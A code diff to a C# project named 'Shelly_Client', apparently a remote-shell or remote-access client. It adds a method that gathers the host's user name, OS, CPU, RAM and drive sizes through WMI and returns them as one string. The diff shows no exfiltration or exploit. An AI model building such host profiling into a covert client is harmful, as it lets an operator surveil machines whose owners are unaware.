@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using System.Drawing.Imaging;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Management;
 
 namespace Shelly_Client
 {
@@ -85,6 +86,101 @@ namespace Shelly_Client
             {
                 // Start IE
                 Process.Start("IExplore.exe", Url);
+            }
+
+            // GetSystemInfo method
+            public static string GetSystemInfo()
+            {
+                // Create string array
+                string[] SysInfo = new string[5];
+
+                // Get computer user name
+                SysInfo[1] = Environment.UserName;
+
+                // Get system ram in MB
+                var Ram = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1048576 + "MB";
+                SysInfo[4] = Ram.ToString();
+
+                // Filter string
+                string Filter = "";
+
+                // For loop
+                for (int i = 0; i < 3; i++)
+                {
+                    // Switch
+                    switch (i)
+                    {
+                        // Set filter
+                        case 0:
+
+                            // Set filter
+                            Filter = "Win32_OperatingSystem";
+                            break;
+
+                        // Set filter
+                        case 1:
+
+                            // Set filter
+                            Filter = "Win32_Processor";
+                            break;
+
+                        // Set filter
+                        case 2:
+
+                            // Set filter
+                            Filter = "Win32_LogicalDisk";
+                            break;
+                    }
+
+                    // Create new instance
+                    using (ManagementObjectSearcher GetDriveName = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + Filter))
+                    {
+                        // Loop though all values
+                        foreach (ManagementObject Name in GetDriveName.Get())
+                        {
+                            // Switch
+                            switch (i)
+                            {
+                                // Get OS name
+                                case 0:
+
+                                    // Set string
+                                    string input = Name["Name"].ToString();
+
+                                    // Set int
+                                    int index = input.IndexOf("|");
+
+                                    // Check if index is greater than 0
+                                    if (index > 0)
+                                    {
+                                        // Trim string
+                                        input = input.Substring(0, index);
+                                    }
+
+                                    // Add info to array
+                                    SysInfo[0] = input;
+                                    break;
+
+                                // Get CPU name
+                                case 1:
+
+                                    // Get CPU name
+                                    SysInfo[2] = Name["Name"].ToString();
+                                    break;
+
+                                // Get drive info
+                                case 2:
+
+                                    // Get drive info
+                                    SysInfo[3] = SysInfo[3] + "Name: " + Name["Caption"].ToString().TrimEnd(':') + " Size: " + (Int64.Parse(Name["Size"].ToString()) / 1073741824) + "GB" + "\n";
+                                    break;
+                            }
+                        }
+                    }
+                }
+
+                // Return info
+                return "Computer name: " + SysInfo[1] + "\n" + "OS: " + SysInfo[0] + "\n" + "CPU: " + SysInfo[2] + "\n" + "Ram: " + SysInfo[4] + "\n" + "Drives:\n\n" + SysInfo[3];
             }
         }
 
